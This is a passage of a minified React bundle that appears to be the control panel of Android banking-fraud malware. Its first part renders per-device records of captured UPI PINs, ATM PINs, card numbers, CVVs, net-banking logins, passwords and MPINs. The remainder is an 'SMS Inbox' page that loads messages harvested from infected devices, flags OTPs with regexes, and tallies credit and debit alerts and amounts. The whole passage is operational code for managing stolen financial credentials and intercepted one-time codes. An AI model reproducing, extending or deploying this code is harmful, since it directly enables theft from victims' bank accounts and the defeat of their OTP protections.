rgba(139,92,246,0.15)"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"4px"},children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:700,color:"#8b5cf6"},children:"📲 UPI Payment"}),i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,background:"rgba(139,92,246,0.1)",padding:"2px 8px",borderRadius:"10px",color:"#8b5cf6"},children:[d.upiCount," entries"]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"2px 10px",fontSize:"12px"},children:[i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Amount"}),i.jsx("br",{}),i.jsxs("span",{style:{fontWeight:700,color:"#8b5cf6"},children:["₹",((X=d.upiData)==null?void 0:X.amount)||"0"]})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"UPI PIN"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,fontFamily:"monospace"},children:((V=d.upiData)==null?void 0:V.upiPin)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"PIN Type"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((E=d.upiData)==null?void 0:E.pinType)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"PIN Length"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((q=d.upiData)==null?void 0:q.pinLength)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Status"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,color:N((ae=d.upiData)==null?void 0:ae.status)},children:((ee=d.upiData)==null?void 0:ee.status)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Device ID"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,fontFamily:"monospace"},children:((T=d.upiData)==null?void 0:T.deviceId)||"N/A"})]}),i.jsxs("div",{style:{gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Timestamp"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((Q=d.upiData)==null?void 0:Q.timestamp)||"N/A"})]})]}),Object.keys(d.allUpiData||{}).length>1&&i.jsxs("div",{style:{marginTop:"4px",fontSize:"9px",color:"var(--text-muted)"},children:["+ ",Object.keys(d.allUpiData).length-1," more entries"]})]}),d.hasCard&&i.jsxs("div",{style:{background:"rgba(46,204,113,0.05)",borderRadius:"8px",padding:"10px 12px",marginBottom:"8px",border:"1px solid rgba(46,204,113,0.15)"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"4px"},children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:700,color:"#2ecc71"},children:"💳 Card Payment"}),i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,background:"rgba(46,204,113,0.1)",padding:"2px 8px",borderRadius:"10px",color:"#2ecc71"},children:[d.cardCount," entries"]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"2px 10px",fontSize:"12px"},children:[i.jsxs("div",{style:{gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Card Number"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,fontFamily:"monospace"},children:((we=d.cardData)==null?void 0:we.cardNumber)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Holder"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((fe=d.cardData)==null?void 0:fe.cardHolder)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Amount"}),i.jsx("br",{}),i.jsxs("span",{style:{fontWeight:700,color:"#2ecc71"},children:["₹",((vn=d.cardData)==null?void 0:vn.amount)||"0"]})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"ATM PIN"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,fontFamily:"monospace"},children:((qe=d.cardData)==null?void 0:qe.atmPin)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"CVV"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,fontFamily:"monospace"},children:((yn=d.cardData)==null?void 0:yn.cvv)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Expiry"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((at=d.cardData)==null?void 0:at.expiry)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Status"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,color:N((Nt=d.cardData)==null?void 0:Nt.status)},children:((mr=d.cardData)==null?void 0:mr.status)||"N/A"})]}),i.jsxs("div",{style:{gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Timestamp"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((bn=d.cardData)==null?void 0:bn.timestamp)||"N/A"})]})]}),Object.keys(d.allCardData||{}).length>1&&i.jsxs("div",{style:{marginTop:"4px",fontSize:"9px",color:"var(--text-muted)"},children:["+ ",Object.keys(d.allCardData).length-1," more entries"]})]}),d.hasNetbank&&i.jsxs("div",{style:{background:"rgba(245,158,11,0.05)",borderRadius:"8px",padding:"10px 12px",marginBottom:"8px",border:"1px solid rgba(245,158,11,0.15)"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"4px"},children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:700,color:"#f59e0b"},children:"🏦 Net Banking"}),i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,background:"rgba(245,158,11,0.1)",padding:"2px 8px",borderRadius:"10px",color:"#f59e0b"},children:[d.netbankCount," entries"]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"2px 10px",fontSize:"12px"},children:[i.jsxs("div",{style:{gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Bank"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((Hs=d.netbankData)==null?void 0:Hs.bankName)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Login ID"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((wo=d.netbankData)==null?void 0:wo.loginId)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Amount"}),i.jsx("br",{}),i.jsxs("span",{style:{fontWeight:700,color:"#f59e0b"},children:["₹",((gr=d.netbankData)==null?void 0:gr.amount)||"0"]})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"MPIN"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,fontFamily:"monospace"},children:((Vs=d.netbankData)==null?void 0:Vs.mpin)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Password"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((xr=d.netbankData)==null?void 0:xr.password)||"N/A"})]}),i.jsxs("div",{children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Status"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600,color:N((Gs=d.netbankData)==null?void 0:Gs.status)},children:((Hr=d.netbankData)==null?void 0:Hr.status)||"N/A"})]}),i.jsxs("div",{style:{gridColumn:"span 2"},children:[i.jsx("span",{style:{color:"var(--text-muted)",fontSize:"9px"},children:"Timestamp"}),i.jsx("br",{}),i.jsx("span",{style:{fontWeight:600},children:((Ys=d.netbankData)==null?void 0:Ys.timestamp)||"N/A"})]})]}),Object.keys(d.allNetbankData||{}).length>1&&i.jsxs("div",{style:{marginTop:"4px",fontSize:"9px",color:"var(--text-muted)"},children:["+ ",Object.keys(d.allNetbankData).length-1," more entries"]})]}),i.jsxs("div",{style:{background:"rgba(108,99,255,0.05)",borderRadius:"8px",padding:"10px 12px",marginBottom:"10px",border:"1px solid rgba(108,99,255,0.15)"},children:[i.jsx("div",{style:{fontSize:"11px",fontWeight:700,color:"#6c63ff",marginBottom:"6px"},children:"📊 Summary"}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr 1fr 1fr 1fr",gap:"4px"},children:[i.jsxs("div",{style:{textAlign:"center",background:"var(--bg-card)",borderRadius:"6px",padding:"4px",border:"1px solid var(--border-color)"},children:[i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"✅"}),i.jsx("div",{style:{fontSize:"16px",fontWeight:700,color:"#3b82f6"},children:d.verificationCount})]}),i.jsxs("div",{style:{textAlign:"center",background:"var(--bg-card)",borderRadius:"6px",padding:"4px",border:"1px solid var(--border-color)"},children:[i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"📲"}),i.jsx("div",{style:{fontSize:"16px",fontWeight:700,color:"#8b5cf6"},children:d.upiCount})]}),i.jsxs("div",{style:{textAlign:"center",background:"var(--bg-card)",borderRadius:"6px",padding:"4px",border:"1px solid var(--border-color)"},children:[i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"💳"}),i.jsx("div",{style:{fontSize:"16px",fontWeight:700,color:"#2ecc71"},children:d.cardCount})]}),i.jsxs("div",{style:{textAlign:"center",background:"var(--bg-card)",borderRadius:"6px",padding:"4px",border:"1px solid var(--border-color)"},children:[i.jsx("div",{style:{fontSize:"8px",color:"var(--text-muted)"},children:"🏦"}),i.jsx("div",{style:{fontSize:"16px",fontWeight:700,color:"#f59e0b"},children:d.netbankCount})]}),i.jsxs("div",{style:{textAlign:"center",background:"rgba(108,99,255,0.08)",borderRadius:"6px",padding:"4px",border:"1px solid rgba(108,99,255,0.2)"},children:[i.jsx("div",{style:{fontSize:"8px",color:"#6c63ff"},children:"📊"}),i.jsx("div",{style:{fontSize:"16px",fontWeight:700,color:"#6c63ff"},children:S(d)})]})]}),i.jsxs("div",{style:{marginTop:"6px",fontSize:"9px",color:"var(--text-muted)",textAlign:"center"},children:["Flow Progress: ",C(d),"% • ",j(d).text]})]}),i.jsx("button",{onClick:()=>{z(),setTimeout(()=>t(`/device/${d.deviceId}`),300)},style:{width:"100%",padding:"11px",marginTop:"4px",border:"none",borderRadius:"8px",background:"linear-gradient(135deg, #6c63ff, #3b82f6)",color:"white",fontSize:"14px",fontWeight:700,cursor:"pointer",transition:"all 0.3s"},onMouseEnter:A=>{A.target.style.transform="translateY(-2px)",A.target.style.boxShadow="0 4px 20px rgba(108,99,255,0.3)"},onMouseLeave:A=>{A.target.style.transform="translateY(0)",A.target.style.boxShadow="none"},children:"📱 View Full Device"})]})]}),i.jsx("style",{children:`
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
          `})]})]})}function Bk(){var Qr,jo;const t=gt(),[e,n]=g.useState(!0),[r,s]=g.useState(!1),[o,a]=g.useState([]),[l,c]=g.useState(""),[d,p]=g.useState([]),[f,u]=g.useState(!1),[b,x]=g.useState(null),[v,_]=g.useState("all"),[m,h]=g.useState("all"),[y,w]=g.useState("all"),[N,R]=g.useState("all"),[S,C]=g.useState(1),[j]=g.useState(20),[P,z]=g.useState([]),[M,L]=g.useState([]),[K,F]=g.useState(new Set),[te,me]=g.useState(!1),[W,D]=g.useState("grid"),[I,X]=g.useState(null),[V,E]=g.useState(!1),[q,ae]=g.useState("newest"),[ee,T]=g.useState(null),[Q,we]=g.useState({}),[fe,vn]=g.useState(null),[qe,yn]=g.useState(!0),[at,Nt]=g.useState({totalSms:0,totalDevices:0,senders:[],credit:0,debit:0,otp:0,totalAmount:0,spam:0,promotional:0,personal:0}),mr=g.useRef(null);g.useRef(null);const bn=g.useRef(!1);g.useEffect(()=>{const k=localStorage.getItem("smsFavorites");if(k)try{we(JSON.parse(k))}catch{}},[]),g.useEffect(()=>{localStorage.setItem("smsFavorites",JSON.stringify(Q))},[Q]);const Hs=(k,H)=>{H.stopPropagation(),we(G=>{const Z={...G};return Z[k]?delete Z[k]:Z[k]=!0,Z})},wo=g.useCallback(k=>{if(!k)return"personal";const H=k.toLowerCase();return/(otp|verification|code|pin|password)/i.test(H)?"personal":/(offer|discount|cashback|sale|promo|deal)/i.test(H)?"promotional":/(spam|scam|fraud|suspicious|alert)/i.test(H)?"spam":(/(credited|debited|paid|payment|transaction|balance)/i.test(H),"personal")},[]),gr=g.useCallback(k=>{if(!k)return"normal";const H=k.toLowerCase();return/\b(\d{4,8})\b/.test(H)&&/(otp|verification|code|pin|password)/i.test(H)?"otp":["credited","credit","received","added","deposited","refund"].some(Pe=>H.includes(Pe))?"credit":["debited","debit","paid","payment","sent","withdrawn"].some(Pe=>H.includes(Pe))?"debit":"normal"},[]),Vs=g.useCallback(k=>{if(!k)return null;const H=k.match(/[₹Rs.]+[\s]*([\d,]+(?:\.\d{2})?)/i);if(H)return parseFloat(H[1].replace(/,/g,""));const G=k.match(/([\d,]+(?:\.\d{2})?)\s*(?:rs\.?|rupees)/i);return G?parseFloat(G[1].replace(/,/g,"")):null},[]),xr=k=>!k||isNaN(k)?"₹0":k>99999999?"₹"+(k/1e7).toFixed(1)+"Cr":k>99999?"₹"+(k/1e5).toFixed(1)+"L":"₹"+k.toLocaleString("en-IN",{maximumFractionDigits:0}),Gs=k=>k?new Date(Number(k)).toLocaleString("en-IN",{day:"2-digit",month:"short",hour:"2-digit",minute:"2-digit",hour12:!0}):"N/A",Hr=k=>{if(!k)return"Never";const H=Date.now()-Number(k);return H<6e4?"Just now":H<36e5?`${Math.floor(H/6e4)}m ago`:H<864e5?`${Math.floor(H/36e5)}h ago`:`${Math.floor(H/864e5)}d ago`},Ys=async()=>{var k;if(!bn.current){bn.current=!0,n(!0);try{const H=B(U,"devices"),G=await ce(H);if(!G.exists()){a([]),n(!1),bn.current=!1;return}const Z=G.val(),Pe=Object.keys(Z),De=[],Ie=new Set;try{const le=await ce(B(U,"device_status"));if(le.exists()){const Se=le.val();for(const[xt,Ve]of Object.entries(Se))(Ve.status==="active"||Ve.status==="online")&&Ie.add(xt)}}catch{}F(Ie);for(const le of Pe){const Se=Z[le],xt=Ie.has(le)||Se.lastSeen&&Date.now()-Number(Se.lastSeen)<12e4;De.push({deviceId:le,serialNo:Se.serialNo||0,brand:Se.brand||"Unknown",model:Se.model||"Device",lastSeen:Se.lastSeen||Se.this_app_installTime,status:xt?"online":"offline",smsCount:0,hasSms:!1,allSmsData:{}})}const ct=Pe.map(le=>ce(B(U,`inbox/${le}`)).catch(()=>({exists:()=>!1}))),Kt=await Promise.all(ct);let wn=[],Ks=0,Qs=0,Wn=0,yr=0,qr=0,qs=0,br=0;const We={};for(let le=0;le<Kt.length;le++){const Se=Kt[le],xt=Pe[le];if(Se.exists()){const Ve=Se.val(),vt=Object.keys(Ve),bp=vt.length,Xs=De.findIndex(ko=>ko.deviceId===xt);Xs!==-1&&(De[Xs].smsCount=bp,De[Xs].hasSms=bp>0,De[Xs].allSmsData=Ve);const Jv=vt.slice(0,5e3);for(const ko of Jv){const Ot=Ve[ko],Js={id:ko,deviceId:xt,sender:Ot.sender||"Unknown",message:Ot.message||Ot.text||"",time:Ot.time||Ot.timestamp||Date.now(),simSlot:Ot.simSlot,category:wo(Ot.message),type:gr(Ot.message),amount:Vs(Ot.message),serialNo:((k=De[Xs])==null?void 0:k.serialNo)||0};wn.push(Js),Ot.sender&&(We[Ot.sender]=(We[Ot.sender]||0)+1);const Al=Js.type;Al==="credit"?Ks++:Al==="debit"?Qs++:Al==="otp"&&Wn++;const _p=Js.category;_p==="spam"?qr++:_p==="promotional"?qs++:br++,Js.amount&&(yr+=Js.amount)}}}De.sort((le,Se)=>Se.smsCount-le.smsCount),wn.sort((le,Se)=>(Se.time||0)-(le.time||0)),a(De),z(wn),L(wn.slice(0,j*2)),yn(wn.length>j*2),Nt({totalSms:wn.length,totalDevices:De.filter(le=>le.hasSms).length,senders:Object.keys(We).sort(),credit:Ks,debit:Qs,otp:Wn,totalAmount:yr,spam:qr,promotional:qs,personal:br}),vn(Date.now())}catch(H){console.error("Error fetching SMS data:",H)}n(!1),bn.current=!1}},A=g.useCallback(()=>{if(r||!qe)return;s(!0);const k=M.length,H=P.slice(k,k+j);H.length>0?(L(G=>[...G,...H]),yn(P.length>k+H.length)):yn(!1),s(!1)},[P,M,qe,r,j]),ne=g.useRef(null),lt=g.useCallback(k=>{r||(ne.current&&ne.current.disconnect(),ne.current=new IntersectionObserver(H=>{H[0].isIntersecting&&qe&&!r&&A()}),k&&ne.current.observe(k))},[r,qe,A]),zt=g.useCallback(()=>{let k=[...P];if(l){const G=l.toLowerCase();k=k.filter(Z=>Z.deviceId.toLowerCase().includes(G)||Z.sender.toLowerCase().includes(G)||Z.message.toLowerCase().includes(G))}if(N!=="all"&&(N==="online"?k=k.filter(G=>K.has(G.deviceId)):k=k.filter(G=>G.deviceId===N)),m!=="all"&&(k=k.filter(G=>G.type===m)),y==="today"){const G=new Date().setHours(0,0,0,0);k=k.filter(Z=>new Date(Number(Z.time)).setHours(0,0,0,0)===G)}else if(y==="week"){const G=Date.now()-6048e5;k=k.filter(Z=>Number(Z.time)>G)}else if(y==="month"){const G=Date.now()-2592e6;k=k.filter(Z=>Number(Z.time)>G)}q==="newest"?k.sort((G,Z)=>(Z.time||0)-(G.time||0)):k.sort((G,Z)=>(G.time||0)-(Z.time||0));const H=k.slice(0,j*2);L(H),yn(k.length>j*2),C(1),vr(k)},[P,l,N,m,y,q,K,j]),vr=g.useCallback(k=>{let H=0,G=0,Z=0,Pe=0;k.forEach(Ie=>{const ct=Ie.type;ct==="credit"&&(H++,Ie.amount&&(Pe+=Ie.amount)),ct==="debit"&&(G++,Ie.amount&&(Pe+=Ie.amount)),ct==="otp"&&Z++});const De=new Set(k.map(Ie=>Ie.deviceId));Nt(Ie=>({...Ie,totalSms:k.length,totalDevices:De.size,credit:H,debit:G,otp:Z,totalAmount:Pe}))},[]),Mt=g.useCallback(k=>{const H=k.type||gr(k.message);return H==="credit"?{text:"🟢 CREDIT",color:"#10b981",bg:"rgba(16,185,129,0.15)"}:H==="debit"?{text:"🔴 DEBIT",color:"#ef4444",bg:"rgba(239,68,68,0.15)"}:H==="otp"?{text:"🟠 OTP",color:"#f59e0b",bg:"rgba(245,158,11,0.15)"}:{text:"📨 MESSAGE",color:"#6c63ff",bg:"rgba(108,99,255,0.15)"}},[gr]),Yt=g.useCallback(k=>k==="spam"?{text:"🚫 SPAM",color:"#ef4444",bg:"rgba(239,68,68,0.1)"}:k==="promotional"?{text:"📢 PROMO",color:"#f59e0b",bg:"rgba(245,158,11,0.1)"}:{text:"👤 PERSONAL",color:"#6c63ff",bg:"rgba(108,99,255,0.1)"},[]),So=k=>{X(k),E(!0),document.body.style.overflow="hidden"},Vr=()=>{E(!1),document.body.style.overflow="auto",setTimeout(()=>X(null),300)},Gr=()=>{u(!1),document.body.style.overflow="auto",setTimeout(()=>{p([]),x(null)},300)},Yr=(()=>{let k=d;return v!=="all"&&(k=k.filter(H=>H.sender===v)),k})(),Co=()=>{const k={};return d.forEach(H=>{H.sender&&(k[H.sender]=(k[H.sender]||0)+1)}),Object.keys(k)},Fe=k=>{t(`/device/${k}`)};if(g.useEffect(()=>{Ys()},[]),g.useEffect(()=>{const k=setTimeout(()=>{P.length>0&&zt()},300);return()=>clearTimeout(k)},[l,N,m,y,q,P,zt]),e)return i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100vh",background:"var(--bg-primary)"},children:[i.jsx("div",{style:{width:"40px",height:"40px",border:"3px solid rgba(108,99,255,0.1)",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsxs("p",{style:{color:"var(--text-muted)",marginTop:"12px"},children:["📡 Loading ",at.totalSms||"..."," messages..."]}),i.jsx("p",{style:{fontSize:"11px",color:"var(--text-muted)",marginTop:"4px"},children:"⏳ Please wait, this may take a moment"}),i.jsx("style",{children:"@keyframes spin{to{transform:rotate(360deg)}}"})]});const Me=(S-1)*j,Kr=M.slice(Me,Me+j),_n=Math.ceil(M.length/j),Tl=Me+1;return i.jsxs("div",{ref:mr,style:{padding:"12px 16px",maxWidth:"100%",background:"var(--bg-primary)",minHeight:"100vh"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"12px",padding:"8px 0 14px",borderBottom:"2px solid var(--border-color)",marginBottom:"16px",flexWrap:"wrap"},children:[i.jsx("button",{onClick:()=>t("/"),style:{background:"none",border:"none",color:"var(--text-muted)",fontSize:"14px",fontWeight:600,cursor:"pointer",padding:"6px 10px",borderRadius:"8px"},children:"← Back"}),i.jsx("h2",{style:{fontSize:"20px",fontWeight:700,color:"var(--text-primary)",margin:0,flex:1},children:"📨 SMS Inbox"}),i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"10px",flexWrap:"wrap"},children:[i.jsxs("span",{style:{fontSize:"12px",fontWeight:600,color:"#6c63ff",background:"rgba(108,99,255,0.1)",padding:"4px 14px",borderRadius:"20px"},children:["📨 ",at.totalSms.toLocaleString()," SMS"]}),i.jsxs("span",{style:{fontSize:"10px",color:"var(--text-muted)"},children:["⏱️ ",fe?Hr(fe):"N/A"]})]})]}),i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(70px, 1fr))",gap:"6px",marginBottom:"16px"},children:[i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#6c63ff"},children:at.totalSms.toLocaleString()}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"📨 Total"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#2ecc71"},children:at.totalDevices}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"📱 Devices"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#10b981"},children:at.credit.toLocaleString()}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"🟢 Credit"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#ef4444"},children:at.debit.toLocaleString()}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"🔴 Debit"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#f59e0b"},children:at.otp.toLocaleString()}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"🟠 OTP"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#6c63ff"},children:xr(at.totalAmount)}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"💰 Total"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#ef4444"},children:at.spam.toLocaleString()}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"🚫 Spam"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"8px 4px",border:"1px solid var(--border-color)",textAlign:"center"},children:[i.jsx("div",{style:{fontSize:"13px",fontWeight:700,color:"#f59e0b"},children:at.promotional.toLocaleString()}),i.jsx("div",{style:{fontSize:"7px",color:"var(--text-muted)"},children:"📢 Promo"})]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"12px",padding:"12px",marginBottom:"16px",border:"1px solid var(--border-color)"},children:[i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(140px, 1fr))",gap:"8px",marginBottom:"8px"},children:[i.jsxs("div",{style:{position:"relative"},children:[i.jsx("span",{style:{position:"absolute",left:"10px",top:"50%",transform:"translateY(-50%)",color:"var(--text-muted)",fontSize:"12px"},children:"🔍"}),i.jsx("input",{type:"text",placeholder:"Search...",value:l,onChange:k=>c(k.target.value),style:{width:"100%",padding:"6px 10px 6px 30px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"12px",outline:"none"}})]}),i.jsxs("select",{value:N,onChange:k=>R(k.target.value),style:{padding:"6px 10px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"12px",outline:"none"},children:[i.jsx("option",{value:"all",children:"📱 All Devices"}),i.jsx("option",{value:"online",children:"🟢 Online"})]}),i.jsxs("select",{value:y,onChange:k=>w(k.target.value),style:{padding:"6px 10px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"12px",outline:"none"},children:[i.jsx("option",{value:"all",children:"📅 All"}),i.jsx("option",{value:"today",children:"📅 Today"}),i.jsx("option",{value:"week",children:"📅 Week"}),i.jsx("option",{value:"month",children:"📅 Month"})]}),i.jsxs("select",{value:q,onChange:k=>ae(k.target.value),style:{padding:"6px 10px",border:"2px solid var(--border-color)",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"12px",outline:"none"},children:[i.jsx("option",{value:"newest",children:"🆕 Newest"}),i.jsx("option",{value:"oldest",children:"📅 Oldest"})]})]}),i.jsx("div",{style:{display:"flex",gap:"4px",flexWrap:"wrap",marginBottom:"8px"},children:["all","credit","debit","otp"].map(k=>i.jsx("button",{onClick:()=>{h(k)},style:{padding:"3px 12px",borderRadius:"14px",border:`2px solid ${m===k?"#6c63ff":"var(--border-color)"}`,background:m===k?"rgba(108,99,255,0.1)":"var(--bg-input)",color:m===k?"#6c63ff":"var(--text-muted)",cursor:"pointer",fontSize:"10px",fontWeight:600},children:k==="all"?"📨 All":k==="credit"?"🟢 Credit":k==="debit"?"🔴 Debit":"🟠 OTP"},k))}),i.jsxs("div",{style:{display:"flex",gap:"6px",flexWrap:"wrap"},children:[i.jsx("button",{onClick:zt,style:{padding:"5px 14px",border:"none",borderRadius:"6px",background:"linear-gradient(135deg, #6c63ff, #3b82f6)",color:"white",cursor:"pointer",fontSize:"11px",fontWeight:600},children:"🔍 Apply"}),i.jsx("button",{onClick:()=>{c(""),R("all"),w("all"),h("all"),ae("newest"),zt()},style:{padding:"5px 14px",border:"2px solid var(--border-color)",borderRadius:"6px",background:"var(--bg-input)",color:"var(--text-muted)",cursor:"pointer",fontSize:"11px",fontWeight:600},children:"🗑️ Clear"}),i.jsx("button",{onClick:Ys,style:{padding:"5px 14px",border:"none",borderRadius:"6px",background:"#28a745",color:"white",cursor:"pointer",fontSize:"11px",fontWeight:600},children:"🔄 Refresh"})]})]}),i.jsxs("div",{style:{fontSize:"11px",color:"var(--text-muted)",marginBottom:"10px"},children:["Showing ",Kr.length," of ",M.length," messages",qe&&M.length<P.length&&i.jsxs("span",{style:{marginLeft:"8px",color:"#6c63ff"},children:["(",P.length-M.length," more)"]})]}),i.jsx("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill, minmax(320px, 1fr))",gap:"10px"},children:Kr.length===0?i.jsxs("div",{style:{gridColumn:"1/-1",textAlign:"center",padding:"40px 20px",color:"var(--text-muted)",background:"var(--bg-card)",borderRadius:"12px",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"40px",display:"block",marginBottom:"8px"},children:"📭"}),i.jsx("p",{children:"No messages found"})]}):Kr.map((k,H)=>{const G=Mt(k),Z=Yt(k.category),Pe=K.has(k.deviceId),De=ee===H,Ie=Tl+H,ct=Q[k.id];return i.jsxs("div",{ref:H===Kr.length-1&&qe?lt:null,onClick:()=>So(k),onMouseEnter:()=>T(H),onMouseLeave:()=>T(null),style:{background:"var(--bg-card)",borderRadius:"10px",padding:"12px 14px",border:"1px solid var(--border-color)",borderLeft:`4px solid ${G.color}`,boxShadow:De?"0 4px 20px rgba(108,99,255,0.08)":"0 1px 4px rgba(0,0,0,0.02)",transition:"all 0.3s 